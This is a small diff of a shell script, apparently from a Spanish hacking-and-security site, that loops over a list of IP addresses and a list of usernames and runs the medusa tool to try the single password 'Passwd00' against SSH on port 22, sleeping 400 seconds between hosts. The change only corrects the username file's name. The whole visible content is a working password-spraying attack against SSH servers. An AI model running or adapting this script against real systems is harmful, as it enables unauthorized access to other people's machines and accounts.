@@ -10,7 +10,7 @@ echo " www.hackingyseguridad.com/ 2024 "
 echo "#################################"
 echo
 for i in `cat ip.txt`;do echo
-for u in `cat usuario0.txt`;do medusa -b -F -h $i -u $u -p Passwd00 -M ssh -n 22
+for u in `cat usuarios0.txt`;do medusa -b -F -h $i -u $u -p Passwd00 -M ssh -n 22
 done
         sleep 400
 done
